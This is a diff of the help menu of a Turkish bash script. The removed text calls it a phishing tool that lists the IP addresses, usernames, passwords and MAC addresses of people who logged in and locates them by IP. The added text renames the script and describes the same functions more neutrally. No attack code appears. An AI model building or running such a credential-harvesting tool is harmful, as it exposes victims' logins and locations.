@@ -9,11 +9,11 @@ case $1 in
 	   sleep 1
        echo -e "
 --help & --h   (Yardım Menüsünü Çağırır)
---ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user         (Giriş Yapılmış Username & Pass)
---mac          (Giriş Yapanların Mac Adresleri)
---location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+--ıp & --ip    (Ip Adresini Listeler)
+--user         (Username & Pass Listeler)
+--mac          (Mac Adresleri Listeler)
+--location     (Ip Adresinden Konum Tespiti)
+bash hasaki.sh & sh hasaki.sh (Aracı Çalıştırır)
    "
   ;;
 
@@ -21,11 +21,11 @@ bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
 	   sleep 1
        echo -e "
 --help & --h   (Yardım Menüsünü Çağırır)
---ıp & --ip    (Giriş Yapmış Kişilerin Ip Adresini Listeler)
---user         (Giriş Yapılmış Username & Pass)
---mac          (Giriş Yapanların Mac Adresleri)
---location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)"
+--ıp & --ip    (Ip Adresini Listeler)
+--user         (Username & Pass Listeler)
+--mac          (Mac Adresleri Listeler)
+--location     (Ip Adresinden Konum Tespiti)
+bash hasaki.sh & sh hasaki.sh (Aracı Çalıştırır)"
 
   ;;
 
